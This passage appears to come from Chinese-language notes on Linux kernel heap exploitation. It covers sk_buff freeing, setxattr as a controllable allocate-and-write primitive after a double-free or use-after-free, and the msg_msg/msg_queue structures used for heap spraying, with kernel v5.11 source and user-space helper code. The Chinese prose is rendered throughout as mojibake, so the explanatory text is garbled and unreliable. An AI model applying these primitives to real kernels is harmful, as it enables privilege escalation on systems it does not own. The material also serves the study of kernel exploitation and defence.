å½“ä»ä¿¡é“ä¸­å°†æŸæ¡æ¶ˆæ¯å…¨éƒ¨è¯»å–å®Œä¹‹åï¼Œä¼šå‘ç”Ÿè¯¥æ¡æ¶ˆæ¯å¯¹åº”çš„`sk_buff`å’Œ`skb->data`çš„å†…å­˜é‡Šæ”¾ï¼Œä¸”`sk_buff`é‡Šæ”¾åˆ°ä¸“é—¨çš„ç¼“å­˜æ± ä¸­ï¼Œ`skb->data`ä½¿ç”¨æ­£å¸¸çš„`kfree`é‡Šæ”¾\n\n- å½“å…³é—­ä¿¡é“ä¸¤ç«¯ï¼Œè¯¥ä¿¡é“å†…äº§ç”Ÿçš„æ‰€æœ‰çš„`sk_buff`å’Œ`skb->data`éƒ½ä¼šå¾—åˆ°é‡Šæ”¾ï¼Œå…·ä½“çš„è°ƒç”¨é“¾ä¸ºï¼š\n\n  ```\n  sock_close()->__sock_release()->unix_release()->__kfree_skb()\n  ```\n\n  åé¢å°±ç±»ä¼¼äº†ã€‚\n\n## 9.setxattr---è¿‘ä¹ä»»æ„å¤§å°\n\nè¿™ä¸ªæ€»ç»“è¿‡ï¼Œç›´æ¥æ‰’è¿‡æ¥\n\nè°ƒç”¨é“¾ä¸º\n\n```\nSYS_setxattr()->path_setxattr()->setxattr()\n```\n\nä»£ç å¦‚ä¸‹\n\n```c\n//fs/xattr.c\nstatic long\nsetxattr(struct user_namespace *mnt_userns, struct dentry *d,\n\t const char __user *name, const void __user *value, size_t size,\n\t int flags)\n{\n\tint error;\n\tvoid *kvalue = NULL;\n\tchar kname[XATTR_NAME_MAX + 1];\n\n\tif (flags & ~(XATTR_CREATE|XATTR_REPLACE))\n\t\treturn -EINVAL;\n\n\terror = strncpy_from_user(kname, name, sizeof(kname));\n\tif (error == 0 || error == sizeof(kname))\n\t\terror = -ERANGE;\n\tif (error < 0)\n\t\treturn error;\n\n\tif (size) {\n\t\tif (size > XATTR_SIZE_MAX)\n\t\t\treturn -E2BIG;\n        //ç”³è¯·chunkï¼ŒåŸºæœ¬ç›¸å½“äºkmallocå‡½æ•°ï¼Œsizeå¯æ§\n\t\tkvalue = kvmalloc(size, GFP_KERNEL);\n\t\tif (!kvalue)\n\t\t\treturn -ENOMEM;\n        //ä»valueæ‹·è´å†…å®¹åˆ°kvalueï¼Œvalueå¯æ§\n\t\tif (copy_from_user(kvalue, value, size)) {\n\t\t\terror = -EFAULT;\n\t\t\tgoto out;\n\t\t}\n\t\tif ((strcmp(kname, XATTR_NAME_POSIX_ACL_ACCESS) == 0) ||\n\t\t    (strcmp(kname, XATTR_NAME_POSIX_ACL_DEFAULT) == 0))\n\t\t\tposix_acl_fix_xattr_from_user(mnt_userns, kvalue, size);\n\t}\n\n\terror = vfs_setxattr(mnt_userns, d, kname, kvalue, size, flags);\nout:\n    //é‡Šæ”¾chunkï¼ŒåŸºæœ¬ç­‰äºkfreeå‡½æ•°\n\tkvfree(kvalue);\n\n\treturn error;\n}\n```\n\nå…³æ³¨ç‚¹åœ¨`kvmalloc`ã€`copy_from_user`ã€`kvfree`ã€‚\n\n`kvmalloc`ä¸­çš„sizeå¯æ§ï¼Œ`copy_from_user`ä¸­çš„`value`å¯æ§\n\nä¹Ÿå°±æ˜¯è¯´å½“`freelist`ä¸­å­˜åœ¨æˆ‘ä»¬éœ€è¦ä¿®æ”¹çš„chunkï¼Œè€Œè¯¥chunkåˆæ˜¯æˆ‘ä»¬æ§åˆ¶çš„æŸä¸ªè®¾å¤‡å†…å­˜å—æ—¶ï¼Œ(é€šè¿‡double-freeæˆ–è€…UAFå®ç°)é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡`setxattr`æ¥å¯¹è¯¥è®¾å¤‡å†…å­˜è¿›è¡Œä»»æ„å†™ã€‚è™½ç„¶æœ€åä¼šé‡Šæ”¾ï¼Œä½†æ˜¯ä¹Ÿåªä¼šå½±å“å†…å­˜å—ä¸­å­˜æ”¾ä¸‹ä¸€ä¸ªchunkåœ°å€å¤„çš„å†…å®¹0x8ä¸ªå­—èŠ‚ï¼Œè€Œå½“æˆ‘ä»¬ç”¨ä¸ç€è¿™ä¸ªåœ°æ–¹çš„å†…å®¹æ—¶ï¼Œå°±ä¸ç”¨å¤ªå…³æ³¨äº†ã€‚\n\n### ğŸ”ºæ³¨ï¼š\n\nä½¿ç”¨çš„æ—¶å€™éœ€è¦æ³¨æ„æŒ‡å®šä¸€ä¸ªå½“å‰çš„expç¨‹åºï¼Œç±»ä¼¼å¦‚ä¸‹ï¼Œç¬¬äºŒä¸ªå‚æ•°å­—ç¬¦ä¸²ä»»æ„ã€‚\n\n```C\nsetxattr(\"/tmp/ufdExp\", \"PIG-007\", &buf,0x100,0);\n```\n\n## 10.msg_msgç»“æ„ä½“---kmalloc-16è‡³kmalloc-1024\n\nè¿™ä¸ªåœ¨ä¹‹å‰ä¹Ÿæ€»ç»“è¿‡ï¼Œä¸è¿‡æ€»ç»“å¾—æœ‰äº›é”™è¯¯ï¼Œä¹Ÿä¸å¤ªå®Œå–„ï¼Œè¿™é‡Œå†å¥½å¥½æ€»ç»“ä¸€ä¸‹\n\nå‚ç…§ï¼š[ã€NOTES.0x08ã€‘Linux Kernel Pwn IVï¼šé€šç”¨ç»“æ„ä½“ä¸æŠ€å·§ - arttnba3's blog](https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#åˆ†é…ï¼ˆGFP-KERNEL-ACCOUNTï¼‰ï¼šmsgsnd-ç³»ç»Ÿè°ƒç”¨)\n\n[Linuxå†…æ ¸ä¸­åˆ©ç”¨msg_msgç»“æ„å®ç°ä»»æ„åœ°å€è¯»å†™ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/252558)\n\n[Linuxçš„è¿›ç¨‹é—´é€šä¿¡ - æ¶ˆæ¯é˜Ÿåˆ— Â· Poor Zorro's Linux Book (gitbooks.io)](https://zorro.gitbooks.io/poor-zorro-s-linux-book/content/linuxde-jin-cheng-jian-tong-xin-xiao-xi-dui-lie.html)\n\nã€ŠLinuxç³»ç»Ÿç¼–ç¨‹æ‰‹å†Œã€‹\n\nè™½ç„¶å†™çš„æ˜¯æœ€å¤§`kmalloc-1024`ï¼Œä½†æ˜¯åœ¨å †å–·æ—¶ï¼Œå¯ä»¥è¿ç»­`kmalloc(1024)`ä»è€Œè·å¾—è¿ç»­çš„å †å†…å­˜åˆ†å¸ƒï¼Œè¿™æ ·éƒ½é‡Šæ”¾æ‰ä¹‹åå†ç»è¿‡å›æ”¶æœºåˆ¶å°±å¯ä»¥ç”³è¯·åˆ°æ›´å¤§çš„`kmallo-xx`äº†ã€‚\n\n### (1)ä½¿ç”¨æ–¹æ³•\n\n#### â‘ åˆ›å»º\n\n- é¦–å…ˆåˆ›å»º`queue_id`ç®¡ç†æ ‡å¿—ï¼Œå¯¹åº”äºå†…æ ¸ç©ºé—´çš„`msg_queue`ç®¡ç†ç»“æ„\n\n  ```c\n  //keyè¦ä¹ˆä½¿ç”¨ftok()ç®—æ³•ç”Ÿæˆ,è¦ä¹ˆæŒ‡å®šä¸ºIPC_PRIVATE\n  //ä»£è¡¨ç€è¯¥æ¶ˆæ¯é˜Ÿåˆ—åœ¨å†…æ ¸ä¸­å”¯ä¸€çš„æ ‡è¯†ç¬¦\n  //ä½¿ç”¨IPC_PRIVATEä¼šç”Ÿæˆå…¨æ–°çš„æ¶ˆæ¯é˜Ÿåˆ—IPCå¯¹è±¡\n  int32_t make_queue(key_t key, int msg_flag)\n  {\n      int32_t result;\n      if ((result = msgget(key, msg_flag)) == -1) \n      {\n          perror(\"msgget failure\");\n          exit(-1);\n      }\n      return result;\n  }\n  \n  int queue_id = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);\n  ```\n\n  ä½¿ç”¨ç®€å•å°è£…çš„`msgget`å‡½æ•°æˆ–è€…ç³»ç»Ÿè°ƒç”¨å·`__NR_msgget`ï¼Œä¹‹åä¿å­˜æ•°æ®çš„æ¶ˆæ¯å°±ä¼šåœ¨è¿™ä¸ª`queue_id`ç®¡ç†æ ‡å¿—ï¼Œä»¥åŠå†…æ ¸ç©ºé—´çš„`msg_queue`ç®¡ç†ç»“æ„ä¸‹è¿›è¡Œåˆ›å»º\n\n#### â‘¡æ•°æ®ä¼ è¾“\n\n- å†™å…¥æ¶ˆæ¯ï¼š\n\n  ç„¶åå°±å¯ä»¥ä¾æ®`queue_id`å†™å…¥æ¶ˆæ¯äº†ï¼Œä¸åŒäº`pipe`å’Œ`socketpair`ï¼Œè¿™ä¸ªéœ€è¦ç‰¹å®šçš„å°è£…å‡½æ•°ï¼ˆ`msgsnd/msgrcv`ï¼‰æˆ–è€…å¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨ï¼ˆ`__NR_msgrcv/__NR_msgsnd`ï¼‰æ¥å®ç°ã€‚\n\n  ```c\n  typedef struct\n  {\n          long mtype;\n          char mtext[1];\n  }msgp;\n  \n  //msg_bufå®é™…ä¸Šä¸ºmsgp,é‡Œé¢åŒ…å«mtype,è¿™ä¸ªmtypeåœ¨åé¢çš„å †å—æ„é€ ä¸­å¾ˆæœ‰ç”¨\n  void send_msg(int msg_queue_id, void *msg_buf, size_t msg_size, int msg_flag)\n  {\n      if (msgsnd(msg_queue_id, msg_buf, msg_size, msg_flag) == -1)\n      {\n          perror(\"msgsend failure\");\n          exit(-1);\n      }\n      return;\n  }\n  \n  char queue_send_buf[0x2000];\n  m_ts_size = 0x400-0x30;//ä»»æ„æŒ‡å®š\n  msg *message = (msg *)queue_send_buf;\n  message->mtype = 0;\n  send_msg(queue_id, message, m_ts_size, 0);\n  ```\n\n- è¯»å–æ¶ˆæ¯ï¼š\n\n  ä¹‹åå³å¯ä¾æ®`queue_id`è¯»å–æ¶ˆæ¯\n\n  ```c\n  void get_msg(int msg_queue_id, void *msg_buf, size_t msg_size, long msgtyp, int msg_flag)\n  {\n      if (msgrcv(msg_queue_id, msg_buf, msg_size, msgtyp, msg_flag) < 0)\n      {\n          perror(\"msgrcv\");\n          exit(-1);\n      }\n      return;\n  }\n  \n  char queue_recv_buf[0x2000];\n  m_ts_size = 0x400-0x30;//ä»»æ„æŒ‡å®š\n  get_msg(queue_id, queue_recv_buf, m_ts_size, 0, IPC_NOWAIT | MSG_COPY);\n  ```\n\n- `mtype`\n\n  å¯é€šè¿‡è®¾ç½®è¯¥å€¼æ¥å®ç°ä¸åŒé¡ºåºçš„æ¶ˆæ¯è¯»å–ï¼Œåœ¨ä¹‹åçš„å †å—æ„é€ ä¸­å¾ˆæœ‰ç”¨\n\n  - åœ¨å†™å…¥æ¶ˆæ¯æ—¶ï¼ŒæŒ‡å®š`mtype`ï¼Œåç»­æ¥æ”¶æ¶ˆæ¯æ—¶å¯ä»¥ä¾æ®æ­¤`mtype`æ¥è¿›è¡Œéé¡ºåºæ¥æ”¶\n  - åœ¨è¯»å–æ¶ˆæ¯æ—¶ï¼ŒæŒ‡å®š`msgtyp`ï¼Œåˆ†ä¸ºå¦‚ä¸‹æƒ…å†µ\n    - `msgtyp`å¤§äº0ï¼šé‚£ä¹ˆåœ¨`find_msg`å‡½æ•°ä¸­ï¼Œå°±ä¼šå°†éå†å¯»æ‰¾æ¶ˆæ¯é˜Ÿåˆ—é‡Œçš„ç¬¬ä¸€æ¡ç­‰äº`msgtyp`çš„æ¶ˆæ¯ï¼Œç„¶åè¿›è¡Œåç»­æ“ä½œã€‚\n    - `msgtyp`ç­‰äº0ï¼šå³ç±»ä¼¼äºé¡ºåºè¯»å–ï¼Œ`find_msg`å‡½æ•°ä¼šç›´æ¥è·å–åˆ°æ¶ˆæ¯é˜Ÿåˆ—é¦–ä¸ªæ¶ˆæ¯ã€‚\n    - `msgtyp`å°äº0ï¼šä¼šå°†ç­‰å¾…çš„æ¶ˆæ¯å½“æˆä¼˜å…ˆé˜Ÿåˆ—æ¥å¤„ç†ï¼Œ`mtype`çš„å€¼è¶Šå°ï¼Œå…¶ä¼˜å…ˆçº§è¶Šé«˜ã€‚\n\n- `msg_flag`\n\nå¯ä»¥å…³æ³¨ä¸€ä¸‹`MSG_NOERROR`æ ‡å¿—ä½ï¼Œæ¯”å¦‚è¯´`msg_flag`æ²¡æœ‰è®¾ç½®`MSG_NOERROR`çš„æ—¶å€™ï¼Œé‚£ä¹ˆæƒ…å†µå¦‚ä¸‹ï¼š\n\nå‡å®šè·å–æ¶ˆæ¯æ—¶è¾“å…¥çš„é•¿åº¦`m_ts_size`ä¸º`0x200`ï¼Œä¸”è¿™ä¸ªé•¿åº¦å¤§äºé€šè¿‡`find_msg()`å‡½æ•°è·å–åˆ°çš„æ¶ˆæ¯é•¿åº¦`0x200`ï¼Œåˆ™å¯ä»¥é¡ºåˆ©è¯»å–ï¼Œå¦‚æœè¯¥é•¿åº¦å°äºè·å–åˆ°çš„æ¶ˆæ¯é•¿åº¦`0x200`ï¼Œåˆ™ä¼šå‡ºç°å¦‚ä¸‹é”™è¯¯\n\n![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511193452872.png)\n\nä½†æ˜¯å¦‚æœè®¾ç½®äº†`MSG_NOERROR`ï¼Œé‚£ä¹ˆå³ä½¿ä¼ å…¥æ¥æ”¶æ¶ˆæ¯çš„é•¿åº¦å°äºè·å–åˆ°çš„æ¶ˆæ¯é•¿åº¦ï¼Œä»ç„¶å¯ä»¥é¡ºåˆ©è·å–ï¼Œä½†æ˜¯å¤šä½™çš„æ¶ˆæ¯ä¼šè¢«æˆªæ–­ï¼Œç›¸å…³å†…å­˜è¿˜æ˜¯ä¼šè¢«é‡Šæ”¾ï¼Œè¿™ä¸ªåœ¨æºä»£ç ä¸­ä¹Ÿæœ‰æ‰€ä½“ç°ã€‚\n\n```c\n//v5.11 /ipc/msg.c do_msgrcvå‡½æ•°ä¸­\nif ((bufsz < msg->m_ts) && !(msgflg & MSG_NOERROR)) {\n    msg = ERR_PTR(-E2BIG);\n    goto out_unlock0;\n}\n```\n\næ­¤å¤–è¿˜æœ‰æ›´å¤šçš„`msg_flag`ï¼Œå°±ä¸ä¸€ä¸€ä¸¾ä¾‹äº†ã€‚\n\n#### â‘¢é‡Šæ”¾\n\nè¿™ä¸ªä¸»è¦æ˜¯ç”¨åˆ°`msgctl`å°è£…å‡½æ•°æˆ–è€…`__NR_msgctl`ç³»ç»Ÿè°ƒç”¨ï¼Œç›´æ¥é‡Šæ”¾æ‰æ‰€æœ‰çš„æ¶ˆæ¯ç»“æ„ï¼ŒåŒ…æ‹¬ç”³è¯·çš„`msg_queue`çš„ç»“æ„\n\n```c\n//å…¶ä¸­IPC_RMIDè¿™ä¸ªcmdå‘½ä»¤ä»£è¡¨é‡Šæ”¾æ‰è¯¥æ¶ˆæ¯é˜Ÿåˆ—çš„æ‰€æœ‰æ¶ˆæ¯,å„ç§å†…å­˜ç»“æ„ä½“ç­‰\nif(msgctl(queue_id),IPC_RMID,NULL)==-1)\n{\n    perror(\"msgctl\");\n    exit(-1);\n}\n```\n\nä¸è¿‡ä¸€èˆ¬ä¹Ÿç”¨ä¸åˆ°ï¼Œå¯èƒ½æŸäº›åˆå¹¶objçš„æƒ…å†µèƒ½ç”¨åˆ°?\n\næ­¤å¤–è¿˜æœ‰æ›´å¤šçš„`cmd`å‘½ä»¤ï¼Œå¸¸ç”¨æ¥è®¾ç½®å†…æ ¸ç©ºé—´çš„`msg_queue`ç»“æ„ä¸Šçš„ç›¸å…³æ•°æ®ï¼Œä¸è¿‡å¤šä»‹ç»äº†ã€‚\n\n#### æ€»ç»“\n\næ€»ç»“ä¸€ä¸‹å¤§è‡´çš„ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹\n\n```c\ntypedef struct\n{\n        long mtype;\n        char mtext[1];\n}msgp;\n\nint32_t make_queue(key_t key, int msg_flag)\n{\n    int32_t result;\n    if ((result = msgget(key, msg_flag)) == -1) \n    {\n        perror(\"msgget failure\");\n        exit(-1);\n    }\n    return result;\n}\n\n\n\nvoid get_msg(int msg_queue_id, void *msg_buf, size_t msg_size, long msgtyp, int msg_flag)\n{\n    if (msgrcv(msg_queue_id, msg_buf, msg_size, msgtyp, msg_flag) < 0)\n    {\n        perror(\"msgrcv\");\n        exit(-1);\n    }\n    return;\n}\n\nvoid send_msg(int msg_queue_id, void *msg_buf, size_t msg_size, int msg_flag)\n{\n    if (msgsnd(msg_queue_id, msg_buf, msg_size, msg_flag) == -1)\n    {\n        perror(\"msgsend failure\");\n        exit(-1);\n    }\n    return;\n}\n\n\nint main()\n{\n    int queue_id, m_ts_size;\n    char queue_recv_buf[0x2000];\n    char queue_send_buf[0x2000];\n    \n    m_ts_size = 0x400-0x30;\n    msgp *message = (msgp *)queue_send_buf;\n    message->mtype = 0;\n    \n    memset(message->mtext,'\\xaa', m_ts_size);\n    memset(queue_recv_buf, '\\xbb', sizeof(queue_recv_buf));\n    \n    queue_id = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);\n    send_msg(queue_id, message, m_ts_size, 0);\n    get_msg(queue_id, queue_recv_buf, m_ts_size, 0, IPC_NOWAIT | MSG_COPY);\n    \n    return 0;\n}\n```\n\n### (2)å†…å­˜åˆ†é…ä¸é‡Šæ”¾\n\n#### â‘ åˆ›å»º\n\n##### A.å†…å­˜ç”³è¯·\n\n- è¿˜æ˜¯éœ€è¦å…ˆåˆ›å»º`msg_queue`ç»“æ„ä½“ï¼Œä½¿ç”¨`msgget`å‡½æ•°ï¼Œè°ƒç”¨é“¾ä¸º\n\n  ```\n  msgget(key,msg_flag)->ksys_msgget()->ipcget()->ipcget_new()->newque()\n  ```\n\n  ä¸»è¦è¿˜æ˜¯å…³æ³¨æœ€åçš„`newque()`å‡½æ•°ï¼Œåœ¨è¯¥å‡½æ•°ä¸­ä½¿ç”¨`kvmalloc()`ç”³è¯·å †å—ï¼Œå¤§å°ä¸º0x100ï¼Œå±äº`kmalloc-256`ï¼Œ(ä¸åŒç‰ˆæœ¬å¤§å°è²Œä¼¼ä¸åŒ)ã€‚\n\n  ```c\n  //v5.11 /ipc/msg.c\n  static int newque(struct ipc_namespace *ns, struct ipc_params *params)\n  {\n  \tstruct msg_queue *msq;\n  \tint retval;\n  \tkey_t key = params->key;\n  \tint msgflg = params->flg;\n  \n      //è¿™ä¸ªæ‰æ˜¯å®é™…ç”³è¯·çš„å †å—å†…å­˜\n  \tmsq = kvmalloc(sizeof(*msq), GFP_KERNEL);\n  \tif (unlikely(!msq))\n  \t\treturn -ENOMEM;\n  \n  \tmsq->q_perm.mode = msgflg & S_IRWXUGO;\n  \tmsq->q_perm.key = key;\n  \n  \tmsq->q_perm.security = NULL;\n      //è¿›è¡Œç›¸å…³æ³¨å†Œ\n  \tretval = security_msg_queue_alloc(&msq->q_perm);\n  \tif (retval) {\n  \t\tkvfree(msq);\n  \t\treturn retval;\n  \t}\n  \n      //åˆå§‹åŒ–\n  \tmsq->q_stime = msq->q_rtime = 0;\n  \tmsq->q_ctime = ktime_get_real_seconds();\n  \tmsq->q_cbytes = msq->q_qnum = 0;\n  \tmsq->q_qbytes = ns->msg_ctlmnb;\n  \tmsq->q_lspid = msq->q_lrpid = NULL;\n  \tINIT_LIST_HEAD(&msq->q_messages);\n  \tINIT_LIST_HEAD(&msq->q_receivers);\n  \tINIT_LIST_HEAD(&msq->q_senders);\n  \n      //ä¸‹é¢ä¸€å †çœ‹ä¸æ‡‚åœ¨å¹²å•¥\n  \t/* ipc_addid() locks msq upon success. */\n  \tretval = ipc_addid(&msg_ids(ns), &msq->q_perm, ns->msg_ctlmni);\n  \tif (retval < 0) {\n  \t\tipc_rcu_putref(&msq->q_perm, msg_rcu_free);\n  \t\treturn retval;\n  \t}\n  \tipc_unlock_object(&msq->q_perm);\n  \trcu_read_unlock();\n  \n  \treturn msq->q_perm.id;\n  }\n  ```\n\n  åˆ›å»ºçš„ç»“æ„ä½“å¦‚ä¸‹æ‰€ç¤º\n\n  ```c\n  //v5.11 /ipc/msg.c\n  struct msg_queue {\n      //è¿™äº›ä¸ºä¸€äº›ç›¸å…³ä¿¡æ¯\n  \tstruct kern_ipc_perm q_perm;\n  \ttime64_t q_stime;\t\t/* last msgsnd time */\n  \ttime64_t q_rtime;\t\t/* last msgrcv time */\n  \ttime64_t q_ctime;\t\t/* last change time */\n  \tunsigned long q_cbytes;\t\t/* current number of bytes on queue */\n  \tunsigned long q_qnum;\t\t/* number of messages in queue */\n  \tunsigned long q_qbytes;\t\t/* max number of bytes on queue */\n  \tstruct pid *q_lspid;\t\t/* pid of last msgsnd */\n  \tstruct pid *q_lrpid;\t\t/* last receive pid */\n  \n      //å­˜æ”¾msg_msgç›¸å…³æŒ‡é’ˆnextã€prev,æ¯”è¾ƒé‡è¦,é€šå¸¸æ‹¿æ¥æº¢å‡ºåˆ¶é€ UAF\n      //å’Œè¯¥æ¶ˆæ¯é˜Ÿåˆ—é‡Œçš„æ‰€æœ‰æ¶ˆæ¯ç»„æˆåŒå‘å¾ªç¯é“¾è¡¨\n  \tstruct list_head q_messages;\n  \tstruct list_head q_receivers;\n  \tstruct list_head q_senders;\n  } __randomize_layout;\n  \n  ```\n\n- æ¥ç€å½“ä½¿ç”¨`msgsnd`å‡½æ•°ä¼ é€’æ¶ˆæ¯æ—¶ï¼Œä¼šåˆ›å»ºæ–°çš„`msg_msg`ç»“æ„ä½“ï¼Œæ¶ˆæ¯è¿‡é•¿çš„è¯å°±ä¼šåˆ›å»ºæ›´å¤šçš„`msg_msgseg`æ¥å­˜å‚¨æ›´å¤šçš„æ¶ˆæ¯ã€‚ç›¸å…³çš„å‡½æ•°è°ƒç”¨é“¾å¦‚ä¸‹ï¼š\n\n  ```c\n  msgsnd(msg_queue_id, msg_buf, msg_size, msg_flag)->do_msgsnd()->load_msg()->alloc_msg()\n  ```\n\n  ä¸»è¦è¿˜æ˜¯å…³æ³¨åœ¨`alloc_msg()`å‡½æ•°\n\n  ```c\n  //v5.11 /ipc/msgutil.c\n  static struct msg_msg *alloc_msg(size_t len)\n  {\n  \tstruct msg_msg *msg;\n  \tstruct msg_msgseg **pseg;\n  \tsize_t alen;\n  \n      //æœ€å¤§å‘é€DATALEN_MSGé•¿åº¦çš„æ¶ˆæ¯\n      //#define DATALEN_MSG\t((size_t)PAGE_SIZE-sizeof(struct msg_msg))\n      //è¿™é‡Œçš„PAGE_SIZEä¸º0x400,å³æœ€å¤škmalloc-\n  \talen = min(len, DATALEN_MSG);\n      //ä½¿ç”¨æ­£å¸¸\n  \tmsg = kmalloc(sizeof(*msg) + alen, GFP_KERNEL_ACCOUNT);\n  \tif (msg == NULL)\n  \t\treturn NULL;\n  \n      //å¦‚æœä¼ å…¥æ¶ˆæ¯é•¿åº¦è¶…è¿‡0x400-0x30,å°±å†è¿›è¡Œç”³è¯·msg_msgsegã€‚\n      //ä½¿ç”¨kmallocç”³è¯·,æ ‡å¿—ä¸ºGFP_KERNEL_ACCOUNTã€‚\n      //æœ€å¤§ä¹Ÿä¸º0x400,ä¹Ÿå±äºkmalloc-1024\n      //è¿˜æœ‰å†é•¿çš„æ¶ˆæ¯,å°±å†ç”³è¯·msg_msgseg\n  \tmsg->next = NULL;\n  \tmsg->security = NULL;\n  \tlen -= alen;\n  \tpseg = &msg->next;\n  \twhile (len > 0) {\n  \t\tstruct msg_msgseg *seg;\n  \t\t//ä¸çŸ¥é“å¹²å•¥çš„\n  \t\tcond_resched();\n  \n  \t\talen = min(len, DATALEN_SEG);\n  \t\tseg = kmalloc(sizeof(*seg) + alen, GFP_KERNEL_ACCOUNT);\n          //ç”³è¯·å®Œä¹‹å,å°†msg_msgsegæ”¾åˆ°msg->nextè¿™ä¸ªå•å‘é“¾è¡¨ä¸Š\n  \t\tif (seg == NULL)\n  \t\t\tgoto out_err;\n  \t\t*pseg = seg;\n  \t\tseg->next = NULL;\n  \t\tpseg = &seg->next;\n  \t\tlen -= alen;\n  \t}\n  \n  \treturn msg;\n  \n  out_err:\n  \tfree_msg(msg);\n  \treturn NULL;\n  }\n  ```\n\n  - `msg_msg`ç»“æ„ä½“å¦‚ä¸‹ï¼Œå¤´éƒ¨å¤§å°`0x30`\n\n    ```c\n    //v5.11 /include/linux/msg.h\n    struct msg_msg {\n    \tstruct list_head m_list;//ä¸msg_queueæˆ–è€…å…¶ä»–çš„msg_msgç»„æˆåŒå‘å¾ªç¯é“¾è¡¨\n    \tlong m_type;\n    \tsize_t m_ts;\t\t/* message text size */\n    \tstruct msg_msgseg *next;//å•å‘é“¾è¡¨ï¼ŒæŒ‡å‘è¯¥æ¡ä¿¡æ¯åé¢çš„msg_msgseg\n    \tvoid *security;\n    \t/* the actual message follows immediately */\n    };\n    ```\n\n    å¦‚ä¸‹æ‰€ç¤º\n\n    <img src=\"https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511220130886.png\" alt=\"image-20220511220130886\" style=\"zoom:80%;\" />\n\n  - `msg_msgseq`ç»“æ„å¦‚ä¸‹ï¼Œåªæ˜¯ä¸€ä¸ª`struct msg_msgseg*`æŒ‡é’ˆ\n\n    ```c\n    //v5.11 /ipc/msgutil.c\n    struct msg_msgseg {\n    \tstruct msg_msgseg *next;\n    \t/* the next part of the message follows immediately */\n    };\n    ```\n\n    å¦‚ä¸‹æ‰€ç¤º\n\n    <img src=\"https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511220627775.png\" alt=\"image-20220511220627775\" style=\"zoom:80%;\" />\n\n###### ç›¸å…³å†…å­˜ç»“æ„ï¼š\n\nåœ¨ä¸€ä¸ª`msg_queue`é˜Ÿåˆ—ä¸‹ï¼Œæ¶ˆæ¯é•¿åº¦ä¸º`0x1000-0x30-0x8-0x8-0x8`\n\n- ä¸€æ¡æ¶ˆæ¯ï¼š\n\n  ![image-20220511231539231](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511231539231.png)\n\n- ä¸¤æ¡æ¶ˆæ¯ï¼š\n\n  ä»¥`msg_queue`çš„`struct list_head q_messages;`åŸŸä¸ºé“¾è¡¨å¤´ï¼Œå’Œ`msg_msg`ç»“æ„çš„`struct list_head m_list`åŸŸä¸²è”æ‰€æœ‰çš„`msg_msg`å½¢æˆåŒå‘å¾ªç¯é“¾è¡¨\n\n  ![æœªå‘½åæ–‡ä»¶](https://pig-007.oss-cn-beijing.aliyuncs.com/img/%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6.png)\n\nåŒç†ï¼ŒåŒä¸€ä¸ª`msg_queue`æ¶ˆæ¯é˜Ÿåˆ—ä¸‹çš„å¤šæ¡æ¶ˆæ¯ä¹Ÿæ˜¯ç±»ä¼¼çš„\n\n###### å†…å­˜ç”³è¯·æ€»ç»“ï¼š\n\n- ä½¿ç”¨`msgget()`å‡½æ•°åˆ›å»ºå†…æ ¸ç©ºé—´çš„æ¶ˆæ¯é˜Ÿåˆ—ç»“æ„`msg_msgseg`ï¼Œè¿”å›å€¼ä¸ºæ¶ˆæ¯é˜Ÿåˆ—çš„`id`æ ‡å¿—`queue_id`\n  - `msg_msgseg`ç®¡ç†æ•´ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ï¼Œå¤§å°ä¸º0x100ï¼Œ`kmalloc-256`ã€‚\n  - å…¶`struct list_head q_messages;`åŸŸä¸ºé“¾è¡¨å¤´ï¼Œå’Œ`msg_msg`ç»“æ„çš„`struct list_head m_list`åŸŸä¸²è”æ‰€æœ‰çš„`msg_msg`å½¢æˆåŒå‘å¾ªç¯é“¾è¡¨\n- æ¯æ¬¡åœ¨è¯¥æ¶ˆæ¯é˜Ÿåˆ—`queue_id`ä¸‹è°ƒç”¨`msgsnd()`å‡½æ•°éƒ½ä¼šç”³è¯·å†…æ ¸ç©ºé—´çš„`msg_msg`ç»“æ„ï¼Œæ¶ˆæ¯é•¿åº¦å¤§äº`0x400-0x30`å°±ä¼šç”³è¯·å†…æ ¸ç©ºé—´çš„`msg_msgseg`ç»“æ„\n  - `msg_msg`ä¸ºæ¯æ¡æ¶ˆæ¯å­˜æ”¾æ¶ˆæ¯æ•°æ®çš„ç»“æ„ï¼Œä¸`msg_queue`å½¢æˆåŒå‘å¾ªç¯é“¾è¡¨ï¼Œä¸`msg_msgseg`å½¢æˆå•å‘é“¾è¡¨å¤§å°æœ€å¤§ä¸º0x400ï¼Œå±äº`kmalloc-64`è‡³`kmalloc-1024`\n  - `msg_msgseg`ä¹Ÿä¸ºæ¯æ¡æ¶ˆæ¯å­˜æ”¾æ¶ˆæ¯æ•°æ®çš„ç»“æ„ï¼ŒæŒ‚åœ¨`msg_msg`å•å‘é“¾è¡¨ä¸­ï¼Œå¤§å°æœ€å¤§ä¸º`0x400`ï¼Œå±äº`kmalloc-16`è‡³`kmalloc-1024`ï¼Œå½“æ¶ˆæ¯é•¿åº¦å¾ˆé•¿æ—¶å°±ä¼šç”³è¯·å¾ˆå¤šçš„å†…æ ¸ç©ºé—´çš„`msg_msgseg`ç»“æ„ã€‚\n\n\n\n##### B.æ•°æ®å¤åˆ¶\n\nè°ƒç”¨å®Œ`alloc_msg()`å‡½æ•°åï¼Œå›åˆ°`load_msg()`å‡½æ•°æ¥ç€è¿›è¡Œæ•°æ®å¤åˆ¶ï¼Œå‡½æ•°è¿˜æ˜¯æŒºç®€å•çš„ã€‚\n\n```c\nstruct msg_msg *load_msg(const void __user *src, size_t len)\n{\n\tstruct msg_msg *msg;\n\tstruct msg_msgseg *seg;\n\tint err = -EFAULT;\n\tsize_t alen;\n\n\tmsg = alloc_msg(len);\n\tif (msg == NULL)\n\t\treturn ERR_PTR(-ENOMEM);\n\n    